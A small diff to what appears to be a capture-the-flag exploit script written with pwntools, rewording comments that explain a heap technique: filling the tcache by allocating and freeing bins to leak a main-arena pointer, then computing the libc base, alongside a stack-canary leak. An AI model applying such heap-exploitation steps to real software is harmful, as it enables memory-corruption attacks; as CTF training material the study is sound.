@@ -145,7 +145,7 @@ info(f"{hex(canary) =}")
 
 p.sendlineafter(">>", "1")
 
-# bin collision magic
+# allocate 9 bins, free 8 to fill up tcache and get a pointer to the main arena on bin #8
 for i in range(10):
 	buy(i)
 
@@ -154,7 +154,7 @@ p.sendlineafter(">>", "3")
 for i in range(9):
 	sell(i)
 
-# leak libc address, calcullate libc base
+# leak main arena address, calcullate libc base
 inventory()
 
 p.recvuntil("[7]: ")
